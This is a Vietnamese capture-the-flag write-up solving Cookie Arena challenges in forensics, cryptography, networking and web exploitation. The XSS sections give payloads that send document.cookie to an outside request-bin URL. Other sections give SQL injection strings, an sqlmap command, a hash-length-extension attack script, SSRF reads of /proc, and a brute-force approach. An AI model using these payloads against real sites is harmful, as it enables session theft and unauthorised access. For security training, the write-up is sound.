# Cookie-Arena-Season-1
## Cre: psycholog1st

## Forensics

### AudiCaty
Tên đề bài và file đính kèm gợi ý chúng ta sử dụng Audacity. Mở audacity và tải open file wav đề cho. Sau đó chọn spectrogram view:

![image](https://user-images.githubusercontent.com/50044415/139641568-2c7841da-46d3-452a-9b44-dc425496d249.png)

Có thể vào spectrogram setting để chỉnh Max Frequency lên khoảng 20000Hz để dễ nhìn hơn

Flag: Flag{No_Bullets_for_Player_001}

### Basic Image
Link Facebook trong bài này là rabbit hole. Chỉ cần tải ảnh về rồi dùng strings và grep là có flag

![image](https://user-images.githubusercontent.com/50044415/139641921-54bd3340-288a-4fbd-8c75-8e3d195ae951.png)

Flag: Flag{metadataratatatataaaaaa}

###  ExSeller
Bản chất của file xlsx là file zip, vì vậy ta đổi đuôi file thành zip sau đó giải nén file. `mv bruteme.xlsx bruteme.zip; unzip bruteme.zi`

Tiếp theo ta grep flag là sẽ có flag

![image](https://user-images.githubusercontent.com/50044415/139642733-d34cc04b-df17-47d0-9113-a3a65dd3b9a6.png)


Flag: Flag{Micro$oft_Heck3r_Man}

###  From The Above 

File wav trong bài là sóng vô tuyến được gửi từ vệ tinh dùng để truyền dữ liệu thời tiết qua SSTV và có thể transform thành image với tool WxToImage. Link: 

https://www.wraase.de/wxtoimg/

Bài này mình dùng Windows để tải phần mềm này về rồi sau đó import file wav vào thì lập tức ta có flag

![image](https://user-images.githubusercontent.com/50044415/139907436-6ced9e5f-b2a6-463e-8231-b5416995fe7e.png)


### Streamer

Bài cho ta 1 file pcapng. Mở file với wireshark. Để ý răng có khá nhiều luồng traffic HTTP.

![image](https://user-images.githubusercontent.com/50044415/139642991-710ad17f-846a-4348-93b1-4748b3aec794.png)

Vì vậy ta vào File -> Export Objects -> HTTP -> Save all

Trong các file được export có 1 file zip có mật khẩu. Ta đọc một vài file php thì thấy 1 dòng có vẻ như là post data có chứa password `username=travisscott&password=truongvinhcuc&submit=Login`

Dùng mật khẩu để giải nén ta có flag.txt. 

Flag: Flag{TCP_streamin_go_skrrrrrrrt}

### Intercep
Bài cho mình một file gif, lên mạng tìm các trang split gif online thì ta có 9 ảnh, mỗi ảnh chứa 1 mảnh QR code. Dùng photoshop cắt dán lại thì ta có mã QR, scan và lấy flag

![image](https://user-images.githubusercontent.com/50044415/140254834-1f8c2e42-5829-4395-873f-109f12580d24.png)



### Volatility
Bài này intended way chắc là dùng volatility mò từ từ, nhưng mà theo thói quen thì mình grep flag từ đầu luôn ai ngờ ra thật.

![image](https://user-images.githubusercontent.com/50044415/139643872-93e02bfc-8aa6-4682-93db-a5b677568ca2.png)


Flag: Flag{7ef31e58bd4086e294b4d700c721f35f}

### Github
Đề bài không cho link user github nên mình tự đoán là gaconlonton hoặc là cookiehanhoan. Vào github thì thấy có user cookiehanhoan thật, thấy có một repo duy nhất là HoangTuEch, vào soi commit thì thấy flag

![image](https://user-images.githubusercontent.com/50044415/139644123-74179a9c-840a-4b12-aefa-39afc13ffe33.png)


Ở phía trên có 1 commit fake flag để rick roll cơ mà mình không để ý nên k bị dính =))

Flag: Flag{no_where_to_hide_gitleaks}


## Cryptography
### XOR
Đề bài yêu cầu chỉ cần XOR chuỗi hex với 1 ký tự, nên mình có thể sử CyberChef để bruteforce xor một cách dễ dàng

![image](https://user-images.githubusercontent.com/50044415/140283310-89723b02-204b-4e7f-9803-0cf25e559361.png)


### Morse
Lên google "Decode morse wav" thì thấy web này cho mình up file wav https://morsecode.world/international/decoder/audio-decoder-adaptive.html

Up luôn và cho nó chạy thì ra hidden message là MORSECODE
![image](https://user-images.githubusercontent.com/50044415/139644459-2779358d-113d-41c9-9c8c-dc63ad75ff22.png)

Flag: Flag{MORSECODE}

### Julius Caesar 
Vào decode.fr decode Ceasar cipher thì ta được Flag{El_Clasico_Cipher}

###  Sixty Four 
Vào CyberChef decode Base64 sau đó chuyển từ Hex về ascii thì ta có flag `Flag{___Base64xHex___}`

### Bruh AES
### Bruh AES
Mục tiêu bài này là tìm được 2 ký tự còn thiếu của IV để giải mã được flag.

Nhìn vào định dạng flag sau khi giải mã thử với iv_part2 bất kỳ thì có thể đoán được nội dung flag là 32 ký tự hex nên mình lọc ra các giá trị iv tạo thành flag thỏa điều kiện.

Sau khi lọc được các giá trị IV thì vẫn còn rất nhiều giá trị nhiễu, nhìn vào IV_part1 có thể đoán được là IV sẽ có định dạng hex.

Nhìn vào các giá trị IV xuất ra thì mình thấy có 0xcafedeadbeefx0 có vẻ hợp lý nên submit thử thì đúng luôn


Code: 
```py
import base64
from Crypto.Cipher import AES
import string


#flag = ###FINDME###
algorithm = AES.MODE_CBC
key = b'supersecretkey!?'
iv_part1 = "0xcafedeadbeef"
#iv_part2 = ###FINDME###""
#iv = iv_part1 + iv_part2
#assert(len(flag)) == 38

def encrypt(payload, key, iv):
    return AES.new(key, algorithm, iv).encrypt(r_pad(payload))
    
def decrypt(payload, key, iv):
    return AES.new(key, algorithm, iv).decrypt(payload)
    
def r_pad(payload, block_size=16):
    length = block_size - (len(payload) % block_size)
    return payload + chr(length) * length

#with open('cipher.txt', 'wb') as f:
#    f.write(encrypt(flag, key, iv))

f = open('cipher.txt', 'rb')
ciphertext = f.read()

CHARSET = string.printable
CHARHEX='0123456789abcdef'
for c1 in CHARHEX:
    for c2 in CHARSET:
        if not (c1.isalnum() and c2.isalnum()):
            continue
        iv = iv_part1+c1+c2
        msg = decrypt(ciphertext,key,iv.encode())
        if all(x in CHARHEX.encode() for x in msg[5:37]):
            print(msg[:38].decode(), iv)
```

### Cry more
Bài này mình search google thì thấy có một bài crypto tương tự từng được dùng trong các CTF trước và có cả writeup nên mình code theo và lấy flag từ đó. Link wu: 
https://chrsow.me/story/2018/05/21/rctf-2018-crypto-writeup.html


Code: 
```py
from pwn import *
import hashpumpy
import datetime
import os
import random
import socketserver
import sys
from base64 import b64decode, b64encode
from hashlib import sha512

r = remote('chal1.crypto.letspentest.org', 7000)

u = r.recvline()
u = r.recvline()
u = r.recvline()
u = r.recvline()
u = r.recvline()
u = r.recvuntil('Your choice: ')
ans = 2
r.sendline(str(ans).encode('utf-8'))
u = r.recv()
print(u)
ans = 6
r.sendline(str(ans).encode('utf-8'))
u = r.recvline()
print(u)
ed_base = u[12:-1]
print(ed_base)
payment = b64decode(ed_base)
print(payment)
sp = payment.rfind(b'&sign=')
print("sp: ",sp)
sign = payment[sp+6:]
print("sign",sign)
#sign = sign[:sign.rfind(b'\n')]
print("sign edit",sign)
payment = payment[payment.rfind(b'product'):payment.rfind(b'&sign')]
print("payment",payment)

for keylen in range(8,32):
    # keylen = 8
    log.info('trying keylen='+str(keylen))

    n = hashpumpy.hashpump(sign, payment, '&price=1', keylen)
    print(n)
    order = n[1] + b"&sign="+ n[0].encode()
    print(order)
    u = r.recv()
    print(u)
    ans = 3
    r.sendline(str(ans).encode('utf-8'))
    u = r.recv()
    print(u)
    anss = b64encode(order)
    r.sendline(anss)
    u = r.recv()
    print(u)

# p.sendline("3")
# p.recvuntil("Your order:")
# p.sendline(order)
# p.recv(1000)
# ret = p.recv(1000)
# if ("Invalid" not in ret):
# print(ret)
# print(p.recvuntil("Money: "))
# quit()
# u = r.recvline()
# ans = 2
# r.sendline(str(ans).encode('utf-8'))
# u = r.recvline()
# print(u)
```

## Network
### Post Office Man
Dùng nc để kết nối với server Pop3 
`nc network.letspentest.org 9002`

Dựa theo gợi ý của bài thì ta đăng nhập vào server với lệnh USER và PASS
`USER psycho`
`PASS psycho`

Đăng nhập thành công, dùng lệnh `LIST` thì ta thấy có tổng cộng 10 message
![image](https://user-images.githubusercontent.com/50044415/139644923-3b45322a-4158-4769-89d3-95b0d7eeb416.png)


Đọc từng thư với lệnh `RETR`, tới message thứ 8 thì ta có flag

![image](https://user-images.githubusercontent.com/50044415/139645048-f3813dff-182b-410a-a12c-ebfe97ba2c17.png)
Flag: Flag{1-Ha\/3-1o0o-UnS33n-3Ma1L}

### Very Good Shipper 
`nmap  network.letspentest.org`

Ta thấy có port 9002 mở, netcat tới và trả lời câu hỏi thì có flag

Flag: Flag{t00-ez-4-y0u}

### Where is my house?
Bài gợi ý dùng DNS, mình dùng lệnh `dig TXT  letspentest.org ` để query tất cả TXT records của domain này.

![image](https://user-images.githubusercontent.com/50044415/139645294-8414bc25-03b6-4168-a4b8-cdc67de5d6f1.png)

Flag: Flag{DNS_A_AAAA_TXT_CNAME}

### Scan me if you can 
Dùng nmap quét từ port 8100 - 9100

![image](https://user-images.githubusercontent.com/50044415/139645457-3d63d04a-087b-4e58-85f1-9fd380fd4e21.png)

Có port 9003 và 9004 mở, ta thử nc với port 9004 thì có flag
![image](https://user-images.githubusercontent.com/50044415/139645537-b828253d-18e0-462e-afc9-4f2f7f728608.png)

Flag: Flag{Every-Header-Have-It-Own-Meaning}

### Secure HTTP
Đề bài gợi ý sử dụng HTTPS ở port 9004, vào browser ta truy cập: https://network-insecure.letspentest.org:9004

Xem certificate của trang 
![image](https://user-images.githubusercontent.com/50044415/139645862-05e3d6a0-9728-4fd5-9c04-13cd29c046cf.png)

Flag: Flag{This-Is-A-Trusted-One}

## Web Exploitation
### XSS
Bài này bot có vấn đề nên mình mất khá nhiều thời gian tuy dễ. Payload: `<script>fetch(<request bin url hoặc ngrok url> + '?c=' + document.cookie)</script>`

Flag: FLAG{10c802c9c6afc26769764b5b986d708a}

### XSS Filter
Có vẻ như bài này bị filter script nên mình dùng các payload sau: (vì bot có vấn đề nên mình không chắc payload nào hoạt động)
```
<img src=1 onerror=fetch(<request bin url hoặc ngrok url> + '?c=' + document.cookie)>
<img src=1 OnErrOr=fetch(<request bin url hoặc ngrok url> + '?c=' + document.cookie)>
<img src=1 onload=fetch(<request bin url hoặc ngrok url> + '?c=' + document.cookie)>
<img src=1 OnLOaD=fetch(<request bin url hoặc ngrok url> + '?c=' + document.cookie)>
```

Flag: FLAG{5b7eca261028a4042fde4e3f45dec294} xss filter

###  Ét Quy Eo 
SQL injection cơ bản
`username: 1' or true -- -`
`password: 1' or true -- -`

Sau đó ta nhận được chuỗi base64, decode thì ra flag

Flag: Flag{Fr33_Styl3}

###  SQL Filter 
Bài này đề filter dấu space, dấu ; và or.

Ta dùng payload sau: `root'/**/OR/**/true/**/--/**/`


Flag: Flag{Gr33t1nG}

P/s Bài này đề kiểm tra Referer Header nên nếu muốn dùng sqlmap có thể dùng command sau:
`sqlmap -u http://chal14.web.letspentest.org/system/ --batch -H "Referer: http://chal14.web.letspentest.org" --forms --crawl=2` còn ra hay không thì mình không rõ =))

### Misconfiguration 
Bài nói check file config. Mình lập tức nghĩ đến 2 file là .htaccess (Apache Server) và web.config (IIS Server)

Vào 2 file trên thì có 2 part của flag, tải file backup trong web.config thì có part cuối. Dùng lệnh `file dummy.bak` thì biết file này là file zip, unzip ta có part3.

Flag: Flag{1b283f0725d536a0f217d89caca7b183}

### Paparazzi
Hiển nhiên là 1 bài SSRF, ta có thể dùng file protocol để đọc file bất kỳ trên server, ngoài ra còn có thể dùng path đến directory như file:/// để có thể xem được list file của dir bất kỳ.

Ta thử file:/// thì thấy có 1 folder src khá là bất thường. Thử file:///src thì trả về invalid url, có vẻ như là bị block.

Process đang sử dụng của web server là process của flask, vì vậy khả năng cao là có thể truy cập được src thông qua /proc/self/cwd, tuy nhiên khả năng là self cũng bị block vì web trả về invalid url.

Đến đây mình quyết định fuzz thử pid, đầu tiên thử file:///proc để xem các pid hiện tại trong ps list
![image](https://user-images.githubusercontent.com/50044415/139650118-969cf337-c5ac-408b-8e83-9d32f04dcae0.png)

Sau đó fuzz các pid, đến pid 434 thì mình có: file:///proc/434/cwd

![image](https://user-images.githubusercontent.com/50044415/139650174-a1f7e0b5-342f-4fa7-bd1b-66d07ca58ecc.png)

Tiếp tục vào thư mục secret
![image](https://user-images.githubusercontent.com/50044415/139650260-18ed07c2-a6ea-46b2-9b95-51fda0149ec4.png)

Đọc flag: 
![image](https://user-images.githubusercontent.com/50044415/139650280-fe9edad5-ef51-43b8-9b51-2e8be96396ae.png)

### Gatling Gun
Bài này đã được cho list username, password và ip ở github của cookiehanhoan

Bắt request login bằng Burp Suite sau đó gửi qua tab Intruder, chọn Cluster Bomb Attack, clear các position sau đó ở mỗi position nhất định chọn các list tương ứng. Sau khi brute force thì ta có flag

Flag: FLAG{e6c068faf9241fe9d1f2000516718377}

###  The maze runner 
Download toàn bộ các folder về `wget http://chal10.web.letspentest.org/ -r`

Sau đó grep flag. Chấp mọi thể loại fake flag

![image](https://user-images.githubusercontent.com/50044415/139650673-208e50c5-1807-4607-9fc2-d5679752d260.png)

Flag: FLAG{6059e2117ea3eeecdad7faf1e15d16a2}

### ID'OR1=1
Bài này mới đầu mình tưởng SQLI nên tốn kha khá time, sau đó fuzz id thì ra 1337 là id có chứa flag

`wfuzz -w /usr/share/seclists/Fuzzing/5-digits-00000-99999.txt -u 'http://chal11.web.letspentest.org/user?id=FUZZ' --hh 24`

Flag: Flag{61cb4a784e83b6109999af6f036b88bf}

## Misc
### Discord

Bài này vào trang rules ở web của ctf thì cũng thấy flag là Flag{Cookie_Han_Hoan}

## Programming

### SUM()
Trong hàm solver chỉ cần split các số ra rồi cộng lại

```py
if len(line) > 0:
            if line[0].isdigit():
                sum = 0
                for i in line.split(' '):
                    if i != '':
                        sum += int(i)
                return sum
 ```

### Pro102
Template của đề đã đầy đủ nên mình chỉ implement code giải trong hàm solver, parse thằng các tham số đề cho rồi giải phương trình bậc 2 như thường

```py
if "X^2" in line:
            a = int(line.split(' ')[0].split('*')[0])
            print(f'a: {a}')
            b = int(line.split(' ')[1] + line.split(' ')[2].split('*')[0])
            print(f'b: {b}')
            c = int(line.split(' ')[3] + line.split(' ')[4])
            print(f'c: {c}')
            d = (b**2) - (4*a*c)
            if d < 0:
                return "NOPE"
            elif d == 0:
                sol = int((-b-math.sqrt(d))/(2*a))
                print(f'1 root, sol: {sol}')
                return f'{sol}, {sol}'
            else:
                sol1 = int((-b-math.sqrt(d))/(2*a))
                sol2 = int((-b+math.sqrt(d))/(2*a))
                print(f'2 roots, sol1: {sol1} sol2: {sol2}')
                return f'{sol1}, {sol2}'
```

### Roberval
Chỉ cần dùng log3(n) thì sẽ có thể lấy được số lần cân chính xác, cụ thể chứng minh các bạn có thể xem trên mạng.

Bài này template của đề cho xử lý hơi khó chịu, nên mình dùng code riêng để giải. 

```py
from pwn import *
import math
r = remote('programming.letspentest.org',8333)
u = r.recvline()
while(1):
    u = r.recvline()
    print(u)
    ans=[]
    for _ in u:
        if(48<=_ and _<=57):
            ans.append(_-48)
    res = 0
    for _ in ans:
        res = res*10+_ 
    aa = int(math.log(res,3))
    u = r.recvline()
    r.sendline(str(aa).encode())
    u = r.recvline()
    print(u)
r.interactive()
```

## Web Basic
### Hân Hoan 
Login thử với admin:admin thì server báo là "You are not CookieHanHoan". Vào check cookie thì thấy có cookie là Role=Guest, đổi lại thành Role=CookieHanHoan thì có flag

###  Header 401 
Vào web thì ta thấy dòng: Hello GET Request. Nice to meet you <3

Inspect source thì thấy: Basic Authentication Credential: gaconlonton/cookiehanhoan

Vậy khả năng là GET request không trả về flag, mình sẽ đổi qua thành POST request đồng thời với Basic cred là base64 của gaconlonton:cookiehanhoan. Cụ thể hơn về Basic Auth các bạn có thể tham khảo ở https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication

Dùng command của linux cho tiện: `curl http://chal3.web.letspentest.org/ -X POST -H "Authorization: Basic $(echo -n 'gaconlonton:cookiehanhoan' | base64 -w 0)"`

###  JS B**p B**p 
Vào source của web thì thấy nó sử dụng 4 script trong static là 1.js, 2.js, 3.js và 4.js. Mở các file này ra đọc thì thấy chúng được viết bởi JSFuck. Mình sẽ dùng web sau để decode JSFuck : https://enkhee-osiris.github.io/Decoder-JSFuck/

Source code sau khi recover:

```js
function verifyUsername(username) {     
  if (username != "cookiehanhoan") {   
    return false
  }   
  return true
}

function reverseString(str) {
  if (str === "")    {
    return ""
  }  
  else {
    return reverseString(str.substr(1)) + str.charAt(0)}
}

function verifyPassword(password) {  
  if (reverseString(password) != "dr0Wss@p3rucreSr3pus") {
    return false 
  }     
  return true  
}

function verifyRole(role) {
  if (role.charCodeAt(0) != 64) {
    return false;
  }       
  if ((role.charCodeAt(1) + role.charCodeAt(2) != 209) && (role.charCodeAt(2) - role.charCodeAt(1) != 9)) {   
    return false       
  }
  if ((role.charCodeAt(3).toString() + role.charCodeAt(4).toString() != "10578") && (role.charCodeAt(3) - role.charCodeAt(4) != 27)) {      
    return false
  }
  return true
}
```

Vậy là code JS sẽ check username = cookiehanhoan, password = dr0Wss@p3rucreSr3pus và role = @dmiN (reverse mã ascii)

### Impossible
Inpect code HTML thì thấy đoạn code JS sau:

```js

function checkPass()
{
	var password = document.getElementById('password').value;
	if (btoa(password.replace("cookiehanhoan", "")) == "Y29va2llaGFuaG9hbg==") {
		window.setTimeout(function() {
			window.location.assign('check.php?password=' + password);
		}, 500);
	}
}
```

Code JS sẽ thay chuỗi cookiehanhoan thành chuỗi rỗng rồi gửi đến /check.php?password=<phần còn lại>. Thử submit lên /check.php?password=cookiehanhoan thì thấy không đúng, vậy ta thử /check.php?password=cookiecookiehanhoanhanhoan (sau khi replace 1 lần thì vẫn còn lại cookiehanhoan) là có flag

###  Infinite Loop 
Bài này mình cũng không hiểu lắm dụng ý của người ra đề, cứ bật Burp Suite lên bỏ request vào Repeater rồi cứ Follow Redirection liên tục thì ta có flag

###  I am not a robot 
Đề bài gợi ý kiểm tra /robots.txt, vào thì thấy có 1 endpoint mới là /fl@g1337_d240c789f29416e11a3084a7b50fade5.txt. Thử truy cập thì ta có flag

### Sause
Bài này inspect source là thấy flag


